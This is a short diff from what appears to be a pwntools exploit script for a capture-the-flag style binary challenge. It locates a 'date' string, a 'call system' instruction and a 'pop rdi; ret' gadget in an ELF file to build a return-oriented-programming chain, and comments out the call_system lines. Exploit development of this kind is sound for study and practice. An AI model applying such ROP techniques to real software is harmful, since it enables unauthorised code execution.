@@ -24,9 +24,9 @@ execute_string = next(elf.search(b'date'))
 info("%#x execute string", execute_string)
 execute_string = p64(next(elf.search(b'date')))
 
-call_system = next(elf.search(asm('call system'), executable = True)))
-info("%#x execute string", execute_string)
-call_system = p64(call_system)
+#call_system = next(elf.search(asm('call system'), executable = True)))[0]
+#info("%#x execute string", execute_string)
+#call_system = p64(call_system)
 
 rop = ROP(elf)
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
